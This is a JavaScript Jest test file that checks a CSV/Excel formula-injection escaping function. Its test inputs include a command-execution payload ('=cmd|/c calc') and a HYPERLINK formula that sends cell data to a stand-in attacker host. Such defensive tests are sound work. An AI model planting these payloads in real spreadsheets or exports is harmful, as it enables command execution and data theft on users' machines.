/**
 * Wave 423 — CSV/Excel formula-injection defence.
 *
 * Locks in `escapeFormulaInjection` semantics so a future refactor
 * can't quietly remove the prefix and re-open the OWASP-CSV-injection
 * class. Pure-function tests, no DB, no MongoMemoryServer.
 */

'use strict';

// (eslint-env jest configured in eslint.config.js for __tests__/; inline comments deprecated)

const { escapeFormulaInjection } = require('../services/importExport/format-helpers');

describe('escapeFormulaInjection (CSV/Excel formula-trigger defence)', () => {
  describe('prefixes formula-trigger characters with single-quote', () => {
    it.each([
      ['=cmd|/c calc'],
      ['=HYPERLINK("//attacker/?d="&A1, "Click")'],
      ['+1+1+cmd'],
      ['-2+3'],
      ['@SUM(A1:A10)'],
      ['\tleading tab'],
      ['\rleading cr'],
    ])('escapes payload starting with trigger char: %j', payload => {
      const out = escapeFormulaInjection(payload);
      expect(out).toBe(`'${payload}`);
    });
  });

  describe('passes through safe strings unchanged', () => {
    it.each([
      'hello',
      'احمد محمد',
      '1234567890',
      'true',
      ' =not-a-trigger', // leading space defangs Excel itself
      '#headerlike',
      '!exclaim',
    ])('leaves %j alone', input => {
      expect(escapeFormulaInjection(input)).toBe(input);
    });
  });

  describe('passes through non-strings unchanged', () => {
    it('null', () => expect(escapeFormulaInjection(null)).toBeNull());
    it('undefined', () => expect(escapeFormulaInjection(undefined)).toBeUndefined());
    it('number', () => expect(escapeFormulaInjection(42)).toBe(42));
    it('boolean', () => expect(escapeFormulaInjection(true)).toBe(true));
    it('empty string', () => expect(escapeFormulaInjection('')).toBe(''));
  });

  it('handles a string of length 1 with a trigger char', () => {
    expect(escapeFormulaInjection('=')).toBe("'=");
    expect(escapeFormulaInjection('+')).toBe("'+");
    expect(escapeFormulaInjection('-')).toBe("'-");
    expect(escapeFormulaInjection('@')).toBe("'@");
  });

  it('only the FIRST char matters — interior triggers stay', () => {
    expect(escapeFormulaInjection('safe=interior')).toBe('safe=interior');
    expect(escapeFormulaInjection('user@example.com')).toBe('user@example.com');
  });
});
